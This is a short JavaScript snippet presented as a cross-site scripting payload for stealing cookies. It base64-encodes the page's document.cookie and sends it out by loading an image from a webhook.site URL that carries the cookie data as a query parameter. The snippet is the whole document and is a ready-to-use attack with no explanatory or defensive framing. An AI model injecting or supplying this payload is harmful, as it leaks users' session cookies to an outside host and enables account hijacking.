// XSS Payload to steal cookies
var img = new Image();
img.src = 'https://webhook.site/8b9fecb9-dff6-4a24-88eb-3d86e0e4aa7a?data=' + btoa(document.cookie);
